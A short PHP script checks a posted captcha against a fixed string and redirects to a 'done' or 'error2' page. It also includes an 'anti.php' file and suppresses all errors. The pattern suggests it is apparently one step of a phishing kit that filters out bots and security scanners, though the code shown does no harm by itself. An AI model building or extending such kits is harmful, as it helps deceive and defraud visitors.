<?php
error_reporting(0);
include('anti.php');
if ($_POST['captcha']== "sb6qn"){
header("Location:  done?ss=o");
}else
{header("Location:  error2?ss=o");
}	
?>